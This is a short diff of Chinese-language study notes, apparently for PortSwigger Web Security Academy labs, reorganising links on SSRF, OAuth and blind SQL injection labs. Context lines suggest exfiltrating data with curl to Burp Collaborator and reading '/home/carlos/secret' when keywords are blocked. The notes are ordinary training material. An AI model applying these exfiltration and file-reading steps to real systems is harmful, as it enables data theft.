@@ -111,7 +111,9 @@ https://portswigger.net/web-security/ssrf/lab-ssrf-with-blacklist-filter (有可
 可以考虑用curl来外带数据到burp collaborator
 curl --data-urlencode 'comment=hello world' url
 
+其它几个比较大概率的lab
 https://portswigger.net/web-security/oauth/openid/lab-oauth-ssrf-via-openid-dynamic-client-registration
+https://portswigger.net/web-security/sql-injection/blind/lab-out-of-band-data-exfiltration
 
 
 反系列化: 难点在于反系列化数据是经过多次编码的，常见的就是url/base64/压缩, 重点就是掌握java/php
@@ -161,7 +163,7 @@ Directory traversal (大概率是会要用它来打组合的)
 
 sqli:
 如何去读取文件内容
-https://portswigger.net/web-security/sql-injection/blind/lab-out-of-band-data-exfiltration
+
 
 下面我们来总结一下读取文件的方法，以防有些keyword被block了我们还有替代方案.
 cat /home/carlos/secret
